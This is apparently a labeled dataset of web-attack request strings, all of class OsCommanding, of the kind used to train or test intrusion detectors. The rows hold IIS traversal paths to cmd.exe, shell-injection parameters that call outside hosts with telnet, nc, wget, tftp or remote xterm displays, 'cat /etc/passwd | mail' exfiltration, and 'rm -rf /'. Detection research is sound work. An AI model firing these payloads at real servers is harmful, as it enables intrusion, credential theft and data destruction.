id,class,vector
80,OsCommanding,/bg85z4sS2/sd3v87/aJDIYRSP6e/sTCAE/it4s8nop3lE/tun1RDGAz7x/eEeeoOnoOaEhcifN/s6UeesotvwiO/sqclC7lEtYth17/netcat0Xln.jsp?6ht=4&eo0w=c+D&0epca4ce4d=06&X3.1=s2H_KdB&oliLu=7214&lbr=R%2F&no3ai8igsrehme=%5C%22%5C%3B+%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.trlltingoris.com++6750%5C%3B&krh=%3FnuIghcati+%3Co2ie1or&H6iosGm=window.open0
86,OsCommanding,/bin/bho.pl/seite=;cat
92,OsCommanding,/eolb6uxYlirserkgqka/efavta/axLShZXIR3BE/UstdinjT/htoatseomtiutoen/XdbodyXandQhtaccesscript0qSidJ3/3E/ha7fNgzNE@.lOyh1UGS/eAH.vIYZ21OGe/6q3fHxtSAfXhadnPw/hhWIRUoCCV/cmE.jpeg?ssltkhx=oamdcoo1it&tdw2ihs=l+dle&tnYmEmu=ooiiNokxat5&uorlrdwmt=de%27boot.inixp_&tccaIjT=+i%5BaetttSnsaqv%27&mo0r=034&JTbO01sock_streamESIgV=mwp-0stdin4tOhboot.ini&OplocationXSQWNU=slr5o&dwrN0L6=%5Cnuftp+-p+www.made.com+++++%2Fieseic%2Froarerststti%2Fllns%2Fitnens%2Ftining%2Fnt
96,OsCommanding,/oe8tnpeatmHaehmiulo9/lhANqONh6cgPr/skC/nzearlwekeDittwso/s2JBMW/4@bW83/nAlrgE/jEdsTdrenocat7/aN/0L1sbodylibA0aytJexec8/aewi.msf?t65tiEl=%5C%22++++%5C%3B++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.matotoit.com+6387%3B&dAhb=0&openfromvFlibIk=be%5D%3E&VWk0httpsvISscriptO=%24hIhf&rros=emtoeooruweno&hinf3ohya1s=56626334&rmarsnw79ia4=bDp0cn2LPM
107,OsCommanding,/tgXXXO/3VE5V/pmDJ3qtVidFlL63q.Pua/axfrcm1dun/kgN/36foeeeERtjrth/mD98jH365yAwdfEgwR6O/suee/oZqOLQrK6-n3SX.exe?oywg0nahhAn9c=t+&ni6cnqi=74&oxe24tea=g
112,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
113,OsCommanding,/afyzRRlj/risw6ozlUste1iaTnlsj/osncwc/sotc3re/ibattUOOe3artZuEt/t2h24Z/sN7.asmx?ficwaoouaiwEAnp=g%40GIJ_GnJH&NdkruscaRcj1a=%27+++%3Buftp+++-g++++%2Fhome%2Fledela%2Filroal+69.173.216.135++++%2Fve+++++%3B&syis6as7rysee=i1thltieEube&aiuenfisse=crt%3E%5Dbetweenuth+&OtaeazuwimtdS=hads4yufnghen&uieh=41556377&5Ie4@KT=o6FeHGN.
118,OsCommanding,/7lam2odHew8l9us/iotnzvbd7cqwegie/dfbt7etsrtadphoii/ohosanhqeI/niotaoAdbcdomwhchi.msf?e5dsmjguat7Aac=are0Sx&J_jxterm=%7C+++++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C++++%2C&em=pLU_l
123,OsCommanding,/scnwsesyRs3Yde/ceetDchnhlt/oxexgaaQ3n/copy2JFyJICVstdinPetcj/HusrEOXincludewnullas/s%u9kacceptNc0D/execc_6Zc_Rz0meta/JNAIj@rqXOq..b5/hfdtalvrrehca/ylelHg/rmNreuYmSnGBNK.9.css?egmotd=sat&0MdjJhttpjZmz3R=aeydiihu9C&eerrej5ds1te=netcatsrgtnNw7idi&ibofn=%27ds%3Bi
126,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
128,OsCommanding,/e6q4al/efUbwLJfacn1U@oPjEG/PSnidUFIW4BPQ/ecJBmJ4vq4/ntuYosneeeepAtSSkwe/7MsK.bin?unnu3atIllwcpm=p&3qe=++%3B+echo++++++++%3B+++++w+++++%3B+++uname+-a++++%3B+++++id&mrrxk=yd&oc=ohml&ysajobichoaqOd=nignh7n5usf6e3orry&h6=tmto%3Adocumentl1a1soaeao&htrrlcs7neoosn=mot+t&hd1tYW=ivNnPbK-Q&epddrdoMnx7e=%2Bn%3Dn&HstyleEfQ=f2duLDoen&oi=s2FduavJk%40W&loIbmrd=oXd&sl=rva2Ao+p5a%3E&c6t7fdvnirltaNs=winnt%3Fmweta%28%25+systemr%3Ae
134,OsCommanding,F4ATQ=%0acat    %0a   /etc/passwd  %0a&4temniaoe=t9voOwl3r
140,OsCommanding,/psmFEqnetcatVE/c5M/nHscd00o/sy9l10BGqcqoh/aNhiern/ii@AYeR.KgpLO/RfirgeeewjAaSea/eJJR/3Tb@jUQ/s7anejt2oIRheteOleAu/iW/trzKWqQqKsEbeRdN.php4?d7nr=hperleweob&hpo5idgBturtui=%22+%3B+telnet++++242.33.150.213++++80++++%3B&.Ewp-@-1telnetC0=i8d&aLSAaoOigekhcsm=e
144,OsCommanding,/adseoeos/cflhFt1khU/sn/al3Op/rCDv5H3RFMaZWjoknuT/3O4a7Qen9eelaeal0n/tH0pFEjdw7@CBpbLG@.png?yeNsetO=rdY&aesPre5i7=%27+++%3B+++++tftp++-c+++++get++++www.rote.com%3A%2Fnitielie.tar&ktIo0sqthOhds=es2mUDiCL7S&lbNn7alm=594471&e2aRivn=Hcdcahd9x&ryNrxol5=h4ipcopytodopt&int1386a7edie=33937&YYen5DTRM0sv=3iaa++d%5Cc&em6rsefla58=15403128&oipsqvgumoistyt=4hrshtacces%3DulQlme6a&9tAUetnal=gwnT&tnwmu=qeoaziiut5vsoteJpc&rfawyolc=nTen2oxl7&0d-gROWn6jMshutdown=%3A%27%3Dtmph
146,OsCommanding,/bin/alibaba.pl|dir
151,OsCommanding,/2Yki/0ne9Ed.htm?n7s=86&fOJHaTet=%22++%3B++%2Fusr%2Fbin%2Fwget++++www.ladees.com%2Fse+++%3B&emiae=etr&nuheemjsmio=%25u%5Bpositionr&y4eeaod=cPqDl.&CUX8=autoexec4t&tdo=faQJn1Vf&j61ply=smodN&srkvda=sOinsertePe0sruo7n&Gut8tDwiyyonru=5996654&XJHm=6iosoebHtfrom%27e
157,OsCommanding,9ktao3aaevkyb=|   /usr/openwin/bin/xterm+-display+221.14.78.168:0%00&8hc=0810&epkryaeig=vhn&onwlPhvhm=497&snu9t= hdsi&e4mutkDi8r51=izh&qeriss=os&m&1rcpCaEy=8208337&uCEmzoquG1=ose s$89edoikr:sgtmpdi&arewmnIloD=5619209
158,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
161,OsCommanding,rsayoLedsclt=tta&eetuRshe=1&sammHsock_streamxmlC=34&dnariiiown=r&kMCk5rR=edteo&1.Q2g4-ayLLc=ang2n&bvXrsae80Eets=t30hXY1D1jJ&th4nNVJVVtmp=cxtermAo&ABHVqu=qi9tm&sDioriFd2sirqYt=rc2?&spassthruOq=92663856&nDatDtac=Eisn&setra=3686493&hnweah=80120&HkmxjKkqUrBt=nlsfd1bwroluh7lSgl
162,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
178,OsCommanding,/rgns/arvda7MrBcsateegEaf/gu/tl3ccB/n@PpUOPT_wy5odb4j/o-uVO3CyAWgWA_sQVMU/ddottdtehecoatstp.gif?ieeiawxbetoh=sak&ounion72r=703&ntledalrj=rias6hdfeo&nerrnthaoo=172865&Aeaf02cGaAscriptN=httpt%25x0d&quR11mftpKbody=81111850&mwget4R8rPA8=igcmdtle&ojsWLp=oehaerriN8&uuoeehwjoea=u&io=%60+++rm++-rf+++++%2F%60&1yboErb=903348&ynabo5=4473799&aptpeh9=r%29%5Bld8Ietosd%3F+ertq%5D&qxf6CSnode@0kopenj=thz8orr
182,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
196,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
203,OsCommanding,/drdNkD/k@BD0CfBVyjt4zIl/1-VFrj5iWGInj0/pJateelYetcjntede/nl/sm/tyTrtno3.1.asp?auhl2ft3ol0Th=fvV&nmoo0wC=%5B&c7arsresEeAjwt=oftesrdderih&ruwfxAgl=sirS%7CwllpM%3Fed%25p&byid=eurui&hht5zkrafcrtsc=0&nhktd=p.DbCni77i&JIOLV8JSR5B=9er&ru2LnSexL3l0H=%250a+++nc++www.enetas.com++80%3B&onoerjRtcWeLatn=tbToDY-r&pZacceptK73Q-Ic8E=blntqe&ikleaido=izeua3replaceml&efh9Nele=u%29tiyhngVhldsai
204,OsCommanding,/ssi/envout.bat?|dir%20..............1
217,OsCommanding,/eoSnrs0nuba4iyLea/1Qk4iSIDall/f@MQKF9NkgZ8orcrEkwI.htm?nodejTOx38winnt=030660&whtFsenE=732066&L6oxdivimgmochaWS6_=18&mSstNdesEmg=h%27&tdacwltia9nb=cat+++++%2Fetc%2Fpasswd+%7C&eIs2fmhle=%3DrEa%5Bb&abl=h4blTg%40f-.
229,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
232,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
237,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
259,OsCommanding,/iesa.css?omte=264059553&kL-W@dpositionqMexmlM=teouttzshn&luunuidkH=itwindow.openezhelike&iett2sm=xMHH&vqo9t=s.D&eyihus=aaE&Set=rQhvaszrneNwmes8&zsel257=fsAc&i0tm=%27+%3B+++tftp++++-c+get+++++www.ilrinaonlare.com%3A%2Fnesero.tar
264,OsCommanding,RutIicahbei=cihtd\Nli&anm8ssfslmyt=705CAdr&teelhetzsv=42742&gtgts1em=dnoteTnitiapeeEci&91U7bBy7CC=962893&Vitwitttyesajau=252&nhdeyi7a3Soneha=8grcpa&_dkEk=50&r7amvodFn=2820541&Wcz8documentP=722865&se=\r     xterm     -display   20.46.224.254:0.0
267,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
279,OsCommanding,/baYPMa8l1h4_q/5niiind1hr4ilC6ih/ofutraafnmVbrwta4usw.tiff?gq8N8jL-=7882&ew5A23=+ii%7C&lytocr23jeaL=ofzselect%7E&w9ose11E=tZ27Hn&sLias9a3pi=aAt0c+w&ACubErsioiar=50.186.113.121++%7C++dir%2Bc%3A%5C&aoinTnol=eas6soliuWfx5di&CongPLUjI=badocumentsocmd69&z%uJvsY.__select-=udp+oEuet&anaNtlucotebb=29
324,OsCommanding,/t0x5E7MsrDixr/ymiohDTgkh0texie4t/l.VzomeNhFkU@8Y@/m1xE_T/eg72a7WuoS5kEdB/XS/hns3eh9F@5/iii5/na23IQteaetMobm/hoUxHg4kw92XAOe4o.jpg?idnibdyi=betweenbodydiwh&aprcnde7iybri=8387476&esj=sUMuQwU&uss=%40hdropy&ent=%5Cnls++%2Froot%2F
325,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
326,OsCommanding,..%c1%8s...%c1%8s..%c1%8s..%c1%8s..%c1%8s../winnt/system32/cmd.exe?/c+dir
327,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
328,OsCommanding,/5Nhoas/oa3poM/mKI7/ty/tyeiXw2jk3i/ayso4/eXs1bjhZ67NNF/raentrwb9/lKFAk00uOKq11HMss6y/yu5oa/-C80ORvujM8BM.mdb?dtsexl=6389&om9feD=%7C+dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+%2C&lItmHstsT=4%3E&geihi=757024190&ogyaSrdleeooc=8lc&sccnoioo4eow4he=hz-and&n9lly=447&a5nt=96755&astaIs=%5Btcad&7dpa0uj=ustmpAME%3Bmco%29r%27ohttpsv8&mrpraaIne=thandiiosapcAx&a9tioastsw6ed=script%24%3A1ciHe%25ygcat
333,OsCommanding,/etcMgCyDLz/cvg5y-hrumpFpgHRMnH/yrdiOeajet9ge/aSTAa/d1/us8nRier2le4e/i6T9L/tTsist2wre/hBB9.jpg?yxdfoYxhm=shutdownne&iUbei=d%5CToalrftlI&hihbhofedi=shutdownviadhdbf+&irearbs=ioit74aOitiziem&ll1vnlte=O%2F%3D3%2B4s&b5Dz8rTg44=55392071&qmmhicatr=tJz9P.mn&Tnzvreeg=ltgeegdni&ve8Tvelec=%5Cr+++xterm+++++-display++++19.112.4.210%3A0.0&ciitmdnhTt=tCs&cgdI40vbscriptC=iG6AKK0.
335,OsCommanding,/eOTznat/hOjUpWByo0/4j_5@3ohmBJi..jpg?cn=ibat&DDYsystem-ZQe0=i+8m5+c%28%2Faccess_logtmcata&eawyssmhNch8=snneelS&whdji86s=rstilf&El4aSIt=1.213.155.23+%3B++tftp+192.168.10.33+test.txt&iOseAzIlsaa=rnshtaccesr&eHVC=opeESanegstynQ&adminLfBK=05&gvYK0imgCa=oeuhfe
336,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
338,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
344,OsCommanding,tesDoilQ=y12VLdOQ&meue=nl&mngroup byevalU8mGnmrP=8&vxabHhti6e=`rm    -rf  /   `&cswihee25oe=93010679&at0tad=E39ager2Eeanes3&jataAtbcarodlsS=1&9tvnxebatie=tgOreplacezsmA&esh7sue6a=3aQ2YNt2J0@X&hmt6nn=r9D&irrogfnr=25699134
345,OsCommanding,tbit8e2e=3385&htGontTi=a8vk-&vUyH4RN0o8libh=s@.g4nBRTT&i8=a@r&fb2vumeohdr=z-zc.&4nm9oiH=871388958&qiahlptsiete=835680&nnOeoH58or=Oihi]&oatde=<d0i&Kh.0dGTcxU=nu9&enrd3aqtod8v=eyoDnr8t&lVmT8Cix=8165333&eiutordetnMno=Wretem9xHi
347,OsCommanding,/d0ca/4oFzeOrx5V/v5sti/rPANVxZk/lZmMnR92la-5GVk/RsDiOvkRWeERb/sooZ9t/Ets2eooTtz5nrueesiK.cfm?rusatduteneArk=%5C%22++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++++www.icieetristto.com+71180++++%3B&hepnolbsx2iyah=Tro%2Be&qZf5OJ4a=s&oeh=6
352,OsCommanding,/u8h6IZtiH1C9adi3Obhh/sffrorrfhtmz5mf/ine1gpsbhatigoxf/U.JQXhkYGn/rxsyTstsehf7/t3vXlfo4juMM/lA8e3RdsystemopenqW/t1JR.OsGtMFC62-VN/perop/ohotattrouveoste/d7zUUBJxtp.exe?toCxx=2nphftseerr+h&ehih=88907&u9dtS=hNK.llx4&aaOdr=hdbia&deoar4g8=58324&81sebjewrsnATt=784&nlEhtlx9onhob=%5C%3B++++%5C%2Fbin%5C%2Fid%3B&nkt=89
361,OsCommanding,/ssi/envout.bat?|dir%20..............1
366,OsCommanding,/er6W6IBhS7hx/i709noQvqAWxIS-PA/1sU4GA/heaInk7iuiesitttbwi0/cq_nMqzpzvHle/tov/tmumFVEoWDwmEEfXNp3F/MXOU7d/tdoAano.aspx?a3otpie=u019Ul&Tdwnofhumro=Yen&2upRxrtnc1Ee=171705&uIauIaarw2bao=b%29havingslxs%28a+n&3r1yrteltme1c=io4s&N5-jVV3=%2B%7Cc&9lR7ctnmee1=%27+++%3B+++++tftp++++-c+++++get++www.reli.com%3A%2Fngitisel.tar&cegnsr4lhd=7
376,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
379,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
385,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
403,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
415,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
416,OsCommanding,"/scripts/file.bat"""
418,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
421,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
432,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
442,OsCommanding,..�
448,OsCommanding,/u@F/n.X/af6oet9/nuB/Bur3scriptksock_streamR3/tqqoeyld.png?iaoFamnuel=88854&0idq_miI=slmalnfh%2B&riud7soeste=%60rm+++-rf++++%2F%60&dha9gnTg5ldzilC=Oewtpasswdaiaok%40y8Re&gemsiisresrfs=tF2sRRg&Kaurform0lh=im&Elyu=IZrlk
449,OsCommanding,..�
452,OsCommanding,"/scripts/file.bat"""
453,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
478,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
484,OsCommanding,/e3O1obkKGQj6IU57TD/rpikFWdQR3o@9V2yl/ttYfafxjjtosdaesla/epdUeTeeednthm.php?yyaoyhhnntso=83953&is3rctSaf9lb=nric&tuhu=yEzha4c8teh5ot&y8sndhnuYOotN=41&eLdGkac2TtkgeE=91609&fitoutUeeUetynb=212987&tlk=0&ltjemuuDg=oweif3seo&hslnu3bhotith=r%40Ck9nkpg&iihfikqjtiB6not=oops++%3Bcat+++%2Fetc%2Fpasswd++%7C++++mail+your%40rZdi.com&niAerhMyfsttl=24860566&wtc=9103401170&67nutitcch=includers5%2F5%25&rZOautoexecFN=oEjOd&5DAq=48
488,OsCommanding,"easAe1acmaht3=evpnfelg&8XjyQ2@divK=00260&64S.MLlFV=""    ;     /usr/bin/wget     www.liilalch.com/ritima;&BJo2tpasswdTE8R=da)urhT(igraX&7e7adAi=83609515&h2=tceew"
491,OsCommanding,/tcnYiGYdgwZ/fNnvJ_hOpg/usiHretartz/tear3dloasn2ciEPTal/nW8.znYiGJ/h88.rlU5r@.GBqF4p/s.OsL/s.lO.vnFr/nadsDg9shabphtvfsrn7.php3?z1ctjetc7SJAnetcatf=90008774&Afth=nutowoncns%5Doinsertaynock%26m&oetsdr9teU=qnc7olEnnullnc0%7EhHunioniss&8w=9788&rmhsg3dkena=Wo%26es%3A&RUwmwdhcAios=1lhavingtyie+6rNs&1nresu=nph-r&sje3d=3059&aaoeodyIqEdr=%250a++cat++%250a%2Fetc%2Fpasswd++++%250a&tbene27ochau=+S+yfrnqjon
494,OsCommanding,..%c1%8s...%c1%8s..%c1%8s..%c1%8s..%c1%8s../winnt/system32/cmd.exe?/c+dir
504,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
507,OsCommanding,/rvreeiTlj/rjFdSSb@l_t9LKyY/iCiyolJJT7p@Cv8_/ayxATfiS1_J/cWfromluzsdKMyCsock_streamsX/haneehusHceos94ew2eH/bt7oAn7nutxd/aqkvSu/noQR7.A@JP48pl/sO.OUS.html?epc=eskmnbYKr&el9Irov2yI=697999835&nFnhnza=426446&8eo=1012&bijeoohwdybh=s-&fn=cldroph&ixea=tsoeene0lacg&4ierjwTshe8ina=%5C%22++++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.teiser.com++8168+++%3B&iicgdyd=3431527&4K7MhscriptAf=ifde&ifl5qedO=bpuisNhedNzts&mcn84uus5dIime=41271&mHVcSIUdZ=6tce%28&sEg=5&Ovn1fq6e8a=ELt
508,OsCommanding,/bin/alibaba.pl|dir
509,OsCommanding,/9y4DFc.XZ.Jh39G/PncY321cmdx/dTWLkjFQN/qybrWPFl6@tt/tc/tFmbQH8p31XNR/ayr/hoq/lJBgI6dkIg/INiT_-4/vewe5ooaiureofcir8ed.png?MXKrbuwp=pVods2iuelued7n&nDweohfsitiA=Ce%3Apsstyshutdown&open-nu7pAXNQwH=25.22.96.187+%7C++++cmd.exe+%2Fs&nrtzn3i3=8&emLuewhne8mtt=34011&E5=n%5C+vsh&1lilosDeetk=992
518,OsCommanding,/lYvUB8UMZ7sT/eKl-LU/7pBm_CgLFmlJoevalq/rreqsiFEeiz8/q7nbiY/gDXsdPpwA6.BTre.js?a-FYjlw=zcmddj&OrN5huq52h=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fbin%2Fcat+++++%2Fetc%2Fpasswd++++%7C
519,OsCommanding,/X8ZBAJ9g/aP7hBFf@uX.gif?sly8nt=%5Cnls++%2Froot%2F
528,OsCommanding,/Hy/sl/3g4hCfuL-KzfieyG2/018v8fgtzc7.5Wg/iAPogr0ttehts/lLn88PW/tFXqlE9F17o3twoODFWM/0DWUUQ0QkB/erooosxreUtlelg3enb/las4ndmynmaqy/s5nhtaeEu82giqi7nna/2KLu-_1imNpTYpM-pSj.php4?Oqeseddteg=%2Fperl++%2Ftmp%2Fma.pl+-p7314&VSQfBpC=chssaet6&psWfZSQ9@A=9395037848&lTen4kep=18517558&reha8jwdnE=%27bP&ofns=%3FrI&hte=%5D&ta5ti6=sthTynti3sr+h3&hriMoqe=526&sTelc3=8866298857&g8663lS5dN=547192&fwwXq=5735143157
531,OsCommanding,/bin/alibaba.pl|dir
545,OsCommanding,/i3IoY7H33Qh5U.js?sefdnel=r.vbwjnR&denrtZc4tegna6=imgfo&Enii4etax=141.250.115.8+++%7C+++dir%2Bc%3A%5C&tzdnayAd0i=eR0heW&eAnsi=%26pf8conph-nsinputs0&ss3rasa=document
549,OsCommanding,/rxh/llsyqH7p6GkJfCcQ/iedcheandaT4clUr/7sEaApa0Tw/4.xW/ctK7_pS2E6CNbvXL6cUN/ry7PXE@LYQA/Afmbgsoundit/nJzauXLrPelCsjPoTEh2/tame/4hfocesseodLah/IQTWxEFB6-SNTG.mdb?ee=s+5ui&K56=%3B+echo+%3B+w++%3B++++uname++-a%3B+++++id&Ma00=63&aktq25rGtt=dnany9tvupricaon&PmRDMZhDTCQ=apaccess_logeh&rfa7=47&HomperlROVsXudopt=t&eigs=4xh&joRHis1hohd8=6030&fthiofhsorn=6&innhyo7=117&de8teen=eSTM&uthThNDlmnoshg=2961954&eihOdxrhet3e=93&etmtvemrsto=iAs%5C
552,OsCommanding,/iLins1Iz_gm5E9x54/lfyaRdqosqOecuusaa2/HgylWNuDt.s/n_HYwfVDtiapjMdmNd/oIW/ea/hnhnescx7ddoewniuoe/x1VoptXBP9/_lEoSJG1ac/ysfrnfzshtmelngxme/7logdcmd4Y/o4a1tuekdnbeb.jpeg?rud=229.74.204.51++%7C++++dir&dtyswydjn4=rrNhttp7i%2F%7E0h%7E+emails4&Tentartzoot8r=lnAb9WIdZ54&VYXNdiv8ciZZWo=oe8uilAn4dtA&cliiu=elw.GzxiW&eoeenslnsr=84468
556,OsCommanding,..�
571,OsCommanding,ifw6om8m5akobt9=uB.gXq6I&tcd5hd=2hndrops
578,OsCommanding,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir
585,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
588,OsCommanding,/Aheg3vigesnaol/vDfZRwmLtMpZoib7WU4/varaCRVIMAd/NE90B/axXKlOU39uyG_7/wityatrHndumcAth/yEOhIrRoanssata.mspx?8t0dFLXN3X=%5Cr++++xterm++++-display+++93.4.216.75%3A0.0
590,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
598,OsCommanding,/ienkjideo/nemvWTP6phv7AVN_D-0T/q8logST/eneeawn/mgk.m35xwI.aspx?EZIXCfOI=cemlebtsc&fnetrnfeaL3is=5&yvhtaccesRstyle2Dx=oTv&bw2e5nisfo9O6=91981321&irau=8seweetra0%3C6to3a&FBmoVscriptdBMy.7=283708&ojmu=f3window.openeha+t&env=naae
604,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
611,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
612,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
615,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
627,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
629,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
